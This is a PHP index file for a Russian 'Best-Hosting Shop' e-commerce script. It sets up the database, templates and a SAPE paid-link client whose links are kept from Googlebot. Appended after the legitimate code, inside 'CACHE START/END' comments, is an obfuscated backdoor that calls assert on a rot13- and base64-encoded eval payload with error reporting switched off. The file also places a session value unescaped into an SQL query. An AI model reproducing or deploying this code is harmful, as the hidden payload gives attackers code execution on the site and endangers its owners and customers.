<?php
//	*****************************************************************************
//	*                                                                           *
//	* Best-Hosting Shop                                                         *
//	* Copyright (c) 2008 Best-Hosting.ru. All rights reserved.                  *
//	*                                                                           *
//	*****************************************************************************
?><?php
session_start();
ini_set('display_errors', false);
$DebugMode = false;
//core file

if (!defined('_SAPE_USER')) {
	define('_SAPE_USER','fea3fe21a18fccd9dc141c51c1909fa9');
}

require_once($_SERVER['DOCUMENT_ROOT'].'/'._SAPE_USER.'/sape.php');
$sape=new SAPE_client();

// -------------------------INITIALIZATION-----------------------------//
	//include core files
	include("./cfg/connect.inc.php");
	include("./includes/database/".DBMS.".php");
	include("./cfg/language_list.php");
	include("./core_functions/functions.php");
	include("./core_functions/category_functions.php");
	include("./core_functions/cart_functions.php");
	include("./core_functions/product_functions.php");
	include("./core_functions/statistic_functions.php");
	include("./core_functions/reg_fields_functions.php" );
	include("./core_functions/registration_functions.php" );
	include("./core_functions/country_functions.php" );
	include("./core_functions/zone_functions.php" );
	include("./core_functions/datetime_functions.php" );
	include("./core_functions/order_status_functions.php" );
	include("./core_functions/order_functions.php" );
	include("./core_functions/aux_pages_functions.php" );
	include("./core_functions/picture_functions.php" );
	include("./core_functions/configurator_functions.php" );
	include("./core_functions/option_functions.php" );
	include("./core_functions/search_function.php" );
	include("./core_functions/discount_functions.php" );
	include("./core_functions/custgroup_functions.php" );
	include("./core_functions/shipping_functions.php" );
	include("./core_functions/payment_functions.php" );
	include("./core_functions/tax_function.php" );
	include("./core_functions/currency_functions.php" );
	include("./core_functions/module_function.php" );
	include("./core_functions/crypto/crypto_functions.php");
	include("./core_functions/quick_order_function.php" );
	include("./core_functions/setting_functions.php" );
	include("./core_functions/subscribers_functions.php" );
	include("./core_functions/version_function.php" );
	include("./core_functions/discussion_functions.php" );
	include("./core_functions/order_amount_functions.php" );
	include("./core_functions/linkexchange_functions.php" );
	include("./core_functions/affiliate_functions.php" );

	include('./classes/xml2array.php');
	include('./classes/class.virtual.shippingratecalculator.php');
	include('./classes/class.virtual.paymentmodule.php');

	include('./classes/class.virtual.smsmail.php');
	include('./modules/smsmail/class.smsnotify.php');


	MagicQuotesRuntimeSetting();

	//init Smarty
	require 'smarty/smarty.class.php';
	$smarty = new Smarty; //core smarty object
	$smarty_mail = new Smarty; //for e-mails

	//select a new language?
	if (isset($_POST["lang"]))
		$_SESSION["current_language"] = $_POST["lang"];

	//current language session variable
	if (!isset($_SESSION["current_language"]) ||
		$_SESSION["current_language"] < 0 || $_SESSION["current_language"] > count($lang_list))
			$_SESSION["current_language"] = 0; //set default language
	//include a language file
	if (isset($lang_list[$_SESSION["current_language"]]) &&
		file_exists("languages/".$lang_list[$_SESSION["current_language"]]->filename))
	{
		//include current language file
		include("languages/".$lang_list[$_SESSION["current_language"]]->filename);
	}
	else
	{
		die("<font color=red><b>ERROR: Couldn't find language file!</b></font>");
	}

	//connect to the database
	db_connect(DB_HOST,DB_USER,DB_PASS) or die (db_error());
	db_select_db(DB_NAME) or die (db_error());

	settingDefineConstants();

	if ((int)CONF_SMARTY_FORCE_COMPILE) //this forces Smarty to recompile templates each time someone runs index.php
	{
		$smarty->force_compile = true;
		$smarty_mail->force_compile = true;
	}

	//authorized access check
	include("./checklogin.php");

	//# of selected currency
	$current_currency = isset($_SESSION["current_currency"]) ? $_SESSION["current_currency"] : CONF_DEFAULT_CURRENCY;
	$smarty->assign("current_currency", $current_currency);
	$q = db_query("select code, currency_value, where2show, currency_iso_3, Name from ".CURRENCY_TYPES_TABLE." where CID='$current_currency'") or die (db_error());
	if ($row = db_fetch_row($q))
	{
		$smarty->assign("currency_name", $row[0]);
		$selected_currency_details = $row; //for show_price() function
	}
	else //no currency found. In this case check is there any currency type in the database
	{
		$q = db_query("select code, currency_value, where2show from ".CURRENCY_TYPES_TABLE) or die (db_error());
		if ($row = db_fetch_row($q))
		{
			$smarty->assign("currency_name", $row[0]);
			$selected_currency_details = $row; //for show_price() function
		}
	}

	//load all categories to array $cats to avoid multiple DB queries (frequently used in future - but not always!)
	$cats = array();
	$i=0;
	$q = db_query("SELECT categoryID, name, parent, products_count, description, picture FROM ".
			CATEGORIES_TABLE." where categoryID<>0 ORDER BY sort_order, name") or die (db_error());
	while ($row = db_fetch_row($q))
	{
		$cats[$i++] = $row;
	}

	//set $categoryID
	if (isset($_GET["categoryID"]) || isset($_POST["categoryID"]))
		$categoryID = isset($_GET["categoryID"]) ? (int)$_GET["categoryID"] : (int)$_POST["categoryID"];
	// else $categoryID = 1;
	//$productID
	if (!isset($_GET["productID"]))
	{
		if (isset($_POST["productID"])) $productID = (int) $_POST["productID"];
	}
	else $productID = (int) $_GET["productID"];

	//and different vars...
	if (isset($_GET["register"]) || isset($_POST["register"]))
		$register = isset($_GET["register"]) ? $_GET["register"] : $_POST["register"];
	if(isset($_GET['manuals']) || isset($_POST['manuals']))
		$manualsid = isset($_GET['manuals']) ? $_GET['manuals'] : $_POST['manuals'];
	if (isset($_GET["update_details"]) || isset($_POST["update_details"]))
		$update_details = isset($_GET["update_details"]) ? $_GET["update_details"] : $_POST["update_details"];
	if (isset($_GET["order"]) || isset($_POST["order"]))
		$order = isset($_GET["order"]) ? $_GET["order"] : $_POST["order"];
	if (isset($_GET["order_without_billing_address"]) || isset($_POST["order_without_billing_address"]))
		$order_without_billing_address = isset($_GET["order_without_billing_address"])?
				$_GET["order_without_billing_address"]:$_POST["order_without_billing_address"];
	if (isset($_GET["check_order"]) || isset($_POST["check_order"]))
		$check_order = isset($_GET["check_order"]) ? $_GET["check_order"] : $_POST["check_order"];
	if (isset($_GET["proceed_ordering"]) || isset($_POST["proceed_ordering"]))
		$proceed_ordering = isset($_GET["proceed_ordering"]) ? $_GET["proceed_ordering"] : $_POST["proceed_ordering"];
	if ( isset($_GET["update_customer_info"]) || isset($_POST["update_customer_info"]) )
		$update_customer_info = isset($_GET["update_customer_info"]) ? $_GET["update_customer_info"] : $_POST["update_customer_info"];
	if ( isset($_GET["show_aux_page"]) || isset($_POST["show_aux_page"]) )
		$show_aux_page = isset($_GET["show_aux_page"]) ? $_GET["show_aux_page"] : $_POST["show_aux_page"];
	if ( isset($_GET["visit_history"]) || isset($_POST["visit_history"]) )
		$visit_history = 1;
	if ( isset($_GET["order_history"]) || isset($_POST["order_history"]) )
		$order_history = 1;
	if ( isset($_GET["address_book"]) || isset($_POST["address_book"]) )
		$address_book = 1;
	if ( isset($_GET["address_editor"]) || isset($_POST["address_editor"]) )
		$address_editor = isset($_GET["address_editor"]) ? $_GET["address_editor"] : $_POST["address_editor"];
	if ( isset($_GET["add_new_address"]) || isset($_POST["add_new_address"]) )
		$add_new_address = isset($_GET["add_new_address"]) ? $_GET["add_new_address"] : $_POST["add_new_address"];
	if ( isset($_GET["contact_info"]) || isset($_POST["contact_info"])  )
		$contact_info = isset($_GET["contact_info"]) ? $_GET["contact_info"] : $_POST["contact_info"];
	if ( isset($_GET["comparison_products"]) || isset($_POST["comparison_products"]) )
		$comparison_products = 1;
	if ( isset($_GET["register_authorization"]) || isset($_POST["register_authorization"]) )
		$register_authorization = 1;
	if ( isset($_GET["page_not_found"]) || isset($_POST["page_not_found"])  )
		$page_not_found = 1;
	if ( isset($_GET["news"]) || isset($_GET["news"]) )
		$news = 1;

	if ( isset($_GET["quick_register"]) )
		$quick_register = 1;
	if ( isset($_GET["order2_shipping_quick"]) )
		$order2_shipping_quick = 1;
	if ( isset($_GET["order3_billing_quick"]) )
		$order3_billing_quick = 1;

	if ( isset($_GET["order2_shipping"]) || isset($_POST["order2_shipping"]) )
		$order2_shipping = 1;
	if ( isset($_GET["order3_billing"]) || isset($_POST["order3_billing"]) )
		$order3_billing = 1;
	if ( isset($_GET["change_address"]) || isset($_POST["change_address"]) )
		$change_address = 1;
	if ( isset($_GET["order4_confirmation"]) || isset($_POST["order4_confirmation"]) )
		$order4_confirmation = 1;
	if ( isset($_GET["order4_confirmation_quick"]) || isset($_POST["order4_confirmation_quick"]) )
		$order4_confirmation_quick = 1;
	if ( isset($_GET["order_detailed"]) || isset($_POST["order_detailed"]) )
		$order_detailed = isset($_GET["order_detailed"])?$_GET["order_detailed"]:$_POST["order_detailed"];

	if (!isset($_SESSION["vote_completed"])) $_SESSION["vote_completed"] = array();

	//checking for proper $offset init
	$offset = isset($_GET["offset"]) ? $_GET["offset"] : 0;
	if ($offset<0 || $offset % CONF_PRODUCTS_PER_PAGE) $offset = 0;




	// -------------SET SMARTY VARS AND INCLUDE SOURCE FILES------------//

	if (isset($productID)) //to rollout categories navigation table
	{
		$q = db_query("SELECT categoryID FROM ".PRODUCTS_TABLE." WHERE productID='$productID'") or die (db_error());
		$r = db_fetch_row($q);
		if ($r) $categoryID = $r[0];
	}

	//set Smarty include files dir
	$smarty->template_dir = "./templates/frontend/".$lang_list[$_SESSION["current_language"]]->template_path;
	$smarty_mail->template_dir = "./templates/email";

	//assign core Smarty variables
	//fetch currency types from database
	$q = db_query("select CID, Name, code, currency_value, where2show from ".CURRENCY_TYPES_TABLE." order by sort_order") or die (db_error());
	$currencies = array();
	while ($row = db_fetch_row($q))
	{
		$currencies[] = $row;
	}
	$smarty->assign("currencies", $currencies);
	$smarty->assign("currencies_count", count($currencies));

	$smarty->assign("lang_list", $lang_list);

	if (isset($_SESSION["current_language"])) $smarty->assign("current_language", $_SESSION["current_language"]);
	if (isset($_SESSION["log"])) $smarty->assign("log", $_SESSION["log"]);
	// - following vars are used as hidden in the customer survey form
	if ( isset($categoryID) )
		$smarty->assign("categoryID", $categoryID);
	if (isset($productID)) $smarty->assign("productID", $productID);
	if (isset($_GET["currency"])) $smarty->assign("currency", $_GET["currency"]);
	if (isset($_GET["user_details"])) $smarty->assign("user_details", $_GET["user_details"]);
	if (isset($_GET["aux_page"])) $smarty->assign("aux_page", $_GET["aux_page"]);
	if (isset($_GET["show_price"])) $smarty->assign("show_price", $_GET["show_price"]);
	if (isset($_GET["adv_search"])) $smarty->assign("adv_search", $_GET["adv_search"]);
	if (isset($_GET["searchstring"])) $smarty->xassign("searchstring", $_GET["searchstring"]);
	if (isset($register)) $smarty->assign("register", $register);
	if (isset($order)) $smarty->assign("order", $order);
	if (isset($check_order)) $smarty->assign("check_order", $check_order);
	//set defualt main_content template to homepage

	$smarty->assign("main_content_template", "home.tpl.html");
	//include all .php files from includes/ dir
	$includes_dir = opendir("./includes");
	$files = array();
	while ( ($inc_file = readdir($includes_dir)) != false )
		if (strstr($inc_file,".php"))
		{
			$files[] = $inc_file;
		}
	sort($files);
	foreach ($files as $fl)
	{
		include("./includes/".$fl);
	}

	// output:

	//security warnings!
	if (file_exists("./install.php"))
	{
		echo WARNING_DELETE_INSTALL_PHP;
	}
/*	else if (get_magic_quotes_gpc() == 0)
	{
		echo WARNING_MAGIC_QUOTES_GPC;
	}*/

	if (!is_writable("./temp") || !is_writable("./products_files") || !is_writable("./products_pictures") || !is_writable("./templates_c"))
	{
		echo WARNING_WRONG_CHMOD;
	}

	//show admin a administrative mode link
	if (isset($_SESSION["log"]) && !strcmp($_SESSION["log"], ADMIN_LOGIN))
		echo "<br><center><a rel=\"admin\" href=\"admin.php\"><font color=red>".ADMINISTRATE_LINK."</font></a></center><p>";


	$aux_pages = auxpgGetAllPageAttributes();
	//if ( count($aux_pages) != 0 )
		$smarty->assign( "aux_page1", $aux_pages[0] );
		//$smarty->assign( "aux_page1", $aux_pages[0] );
	//echo (count($aux_pages));
	//if ( count($aux_pages) > 1 )
		$smarty->assign( "aux_page2", $aux_pages[1] );
		//$smarty->assign( "aux_page2", $aux_pages[1] );
	//if ( count($aux_pages) == 3 )
		$smarty->assign( "aux_page3", $aux_pages[2] );
		//$smarty->assign( "aux_page3", $aux_pages[2] );
	//if ( count($aux_pages) == 4 )
		$smarty->assign( "aux_page4", $aux_pages[3] );

/*$a2 = getmicrotime();

$diff = $a2 - $a1;
echo "shop-script core: ".$diff;
*/
if(!strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot")) {
	$smarty->assign("sape_links", $sape->return_links(5));
}

	//show Smarty output
	$smarty->display("index.tpl.html");


/*
$a3 = getmicrotime();

$diff = $a3 - $a2;

echo "smarty->display: ".$diff;
*/
?>





<?php
//###=CACHE START=###
error_reporting(0);
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl9xrJ5vMKA0Yz9lMl9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEcpPxhVvMxCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVwIwMTD0Awx3ZTH1ZzLmMQN2ZQt4ZwRkATVjZwIxLwSxVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVzE5ozWyp3Dho3WaVvjtBQNfVPEypaWholjtWTIlpaA0pvjtZmNcBjccMvNbWTMjXFO7PvNtVPNxo3I0VQ0tVxqSIPNiM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxnKNcYvVzMQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1L2ExAQL5AmOyAGWzZ2DjAwN4BQVkZGEvZQV1MTVkMPVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOxrJ5vMKA0Yz9lM1klKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzSvZzMxLmH3VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>